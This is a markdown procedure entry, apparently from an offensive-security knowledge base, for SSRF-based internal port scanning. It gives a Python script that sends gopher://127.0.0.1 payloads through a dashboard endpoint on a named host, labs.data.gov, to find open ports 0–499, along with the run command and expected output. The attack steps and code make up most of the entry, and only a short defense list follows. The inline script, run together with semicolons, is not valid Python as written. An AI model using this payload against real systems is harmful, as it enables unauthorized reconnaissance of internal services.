---
id: proc-uuid-8
tags:
  - automation
  - port-scanning
  - python
  - ssrf
type: procedure
tools:
  - '[[tools/python-requests]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/python-ssrf-port-scanner]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Service Scanning]]'
updated_at: '2025-12-14T03:46:09.343Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Network Service Scanning]]'
---
# Automate-Port-Scanning-with-Python-Script

## Summary

This procedure automates SSRF-based port scanning using a Python script with the requests library to probe ports 0-499 on localhost via gopher payloads, detecting open ports through request timeouts and exceptions.

## Description

The script exp.py sends GET requests to /dashboard/Campaign/json_status/gopher://127.0.0.1:PORT/ with a 5-second timeout; open ports cause exceptions/timeouts, closed ones succeed quickly. Run on a local machine targeting the AWS app. Prerequisites: Python and requests installed. Outcomes: Comprehensive list of open internal ports.

## Requirements

1. Python 3 with requests library
2. Script file exp.py prepared
3. Network access to target

## Defense

Defensive measures and detection strategies:

- Rate limit requests to SSRF endpoints to prevent scanning.
- IDS rules for repeated gopher:// patterns.
- Anomaly detection on timeout frequencies.

## Objectives

1. Scale manual scanning to full range.
2. Identify all open services.
3. Validate reconnaissance findings.

## Instructions

### Step 1: Prepare Script

**Context**: Write exp.py to loop ports and check responses.

Example code: import requests; for port in range(500): try: r = requests.get(f'https://labs.data.gov/dashboard/Campaign/json_status/gopher://127.0.0.1:{port}/', timeout=5); if r.status_code != 200: print(f'PORT: {port} OPEN'); except: print(f'PORT: {port} OPEN')

### Step 2: Execute Script

**Context**: Run to scan ports 0-499.

**Command** ([[commands/python-ssrf-port-scanner]]):

```bash
python exp.py
```

> Expected: Outputs like "PORT: 25 OPEN", "PORT: 80 OPEN", "PORT: 443 OPEN" for detected opens.

### Step 3: Review Results

**Context**: Analyze open ports for next steps.

Parse output for services like SMTP (25), HTTP (80).

> Confirms manual scan: 25,80,443 open.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Network Service Scanning]] Network Service Scanning

### Sub-Techniques


## Commands Used

- [[commands/python-ssrf-port-scanner]]

## Tools Used

- [[tools/python-requests]]

## Tags

- [[automation]]
- [[Scripting]]
